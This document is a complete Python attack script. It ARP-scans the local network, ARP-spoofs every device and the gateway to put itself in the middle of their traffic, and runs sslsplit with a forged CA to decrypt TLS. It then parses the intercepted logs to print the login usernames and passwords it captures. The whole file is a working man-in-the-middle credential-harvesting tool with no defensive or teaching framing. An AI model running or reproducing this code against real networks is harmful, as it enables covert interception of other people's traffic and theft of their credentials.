#!/usr/bin/env python3

import os
import time
import threading
import netifaces as ni

from math import log2
from subprocess import Popen, DEVNULL
from scapy.all import ARP, Ether, srp, send


def get_device_info():
    gateway   = ni.gateways()['default'][ni.AF_INET]
    interface = ni.ifaddresses(gateway[1])[ni.AF_INET][0]
    cidr      = 32 - sum([int(log2(256 - int(num))) for num in interface['netmask'].split('.')])

    arp       = ARP(pdst=f'{interface["addr"]}/{cidr}')
    broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
    packet    = broadcast / arp
    results   = srp(packet, timeout=3, verbose=False)[0]
    device    = { recv.psrc: recv.hwsrc for sent, recv in results }

    print('Available devices')
    print('+-----------------+-------------------+')
    print('|   IP Address    |    MAC Address    |')
    print('+-----------------+-------------------+')
    for ip in device:
        if ip != gateway[0]:
            print(f'| {ip:<15s} | {device[ip]:<17s} |')
    print('+-----------------+-------------------+')

    return gateway, device


def arp_spoofing(gateway, device):
    for ip in device:
        if ip == gateway[0]: continue
        victim = ARP(op=2, hwdst=device[ip], pdst=ip, psrc=gateway[0])
        router = ARP(op=2, hwdst=device[gateway[0]], pdst=gateway[0], psrc=ip)
        send(victim, verbose=False)
        send(router, verbose=False)


def sslsplit():
    command = [
        'sslsplit', '-D', '-S', 'sslsplit-log', '-p', 'sslsplit.pid',
        '-k', 'ca.key', '-c', 'ca.crt', 'ssl', '0.0.0.0', '8443'
    ]
    Popen(command, stdout=DEVNULL, stderr=DEVNULL)


def get_username_and_password():
    try:
        while True:
            directory = 'sslsplit-log'
            for filename in os.listdir(os.path.join('.', directory)):
                if '.bak' in filename: continue
                found = False
                with open(os.path.join('.', directory, filename), 'r', errors='replace') as f:
                    lines = f.readlines()
                    for line in lines:
                        if 'logintoken' in line:
                            found = True
                            username = line.split('&')[1].split('=')[1]
                            password = line.split('&')[2].split('=')[1]
                            print(f'Username: {username}\nPassword: {password}')
                if found:
                    pathname = os.path.join('.', directory, filename)
                    os.rename(pathname, pathname + '.bak')
            time.sleep(1)
            if not os.path.exists('sslsplit.pid'): return
    except KeyboardInterrupt:
        return


def main():
    if os.geteuid() != 0:
        exit(f'{__file__}: Permission denied')

    gateway, device = get_device_info()
    arp_spoofing(gateway, device)
    sslsplit()

    thread = threading.Thread(target=get_username_and_password)
    thread.start()

    while True:
        try:
            arp_spoofing(gateway, device)
            time.sleep(3)
        except KeyboardInterrupt:
            if os.path.exists('sslsplit.pid'):
                with open('sslsplit.pid') as f:
                    pid = next(f).strip()
                    command = ['kill', '-15', pid]
                    Popen(command, stdout=DEVNULL, stderr=DEVNULL)
            print("\nDetected CTRL + C pressed and Exiting ...")
            break

    thread.join()


if __name__ == '__main__':
    main()
